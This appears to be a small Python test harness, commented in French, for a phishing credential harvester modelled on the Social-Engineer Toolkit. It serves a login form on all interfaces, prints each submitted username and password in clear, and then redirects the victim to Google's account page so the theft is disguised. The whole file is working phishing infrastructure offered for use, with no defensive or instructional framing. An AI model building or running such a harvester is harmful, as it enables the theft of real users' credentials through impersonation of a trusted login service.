"""
Test local : simule SET sur le port 8888 et affiche chaque GET/POST.
Usage : python test-harvest.py
Puis ouvre http://127.0.0.1:8888/ et envoie le formulaire.
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
from pathlib import Path
from urllib.parse import parse_qs

PORT = 8888
ROOT = Path(__file__).resolve().parent


class TestHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def do_GET(self):
        print(f"\n>>> GET {self.path} depuis {self.client_address[0]}")
        return super().do_GET()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        print(f"\n>>> POST {self.path} depuis {self.client_address[0]}")
        print(f"    Content-Type: {self.headers.get('Content-Type')}")
        print(f"    Corps brut: {body}")

        if "application/x-www-form-urlencoded" in self.headers.get("Content-Type", ""):
            data = parse_qs(body)
            print(f"    username = {(data.get('username') or [''])[0]}")
            print(f"    password = {(data.get('password') or [''])[0]}")

        self.send_response(302)
        self.send_header("Location", "https://accounts.google.com/")
        self.end_headers()


def main():
    os.chdir(ROOT)
    server = HTTPServer(("0.0.0.0", PORT), TestHandler)
    print(f"Test harvester : http://127.0.0.1:{PORT}/")
    print("Si POST s'affiche ici, le formulaire HTML est OK.")
    print("Ctrl+C pour arreter")
    server.serve_forever()


if __name__ == "__main__":
    main()
